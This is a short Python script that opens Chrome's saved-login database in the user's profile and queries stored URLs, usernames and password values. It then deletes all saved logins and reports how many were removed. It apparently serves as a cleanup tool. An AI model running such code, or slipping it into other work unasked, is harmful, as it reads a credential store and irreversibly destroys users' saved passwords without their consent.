import os
import sqlite3

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                       "Google", "Chrome", "User Data", "default", "Login Data")
db = sqlite3.connect(db_path)
cursor = db.cursor()
cursor.execute(
    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
pass_nb = len(cursor.fetchall())
cursor.execute("delete from logins")
print(f"Deleted a total of {pass_nb} passwords")
cursor.connection.commit()
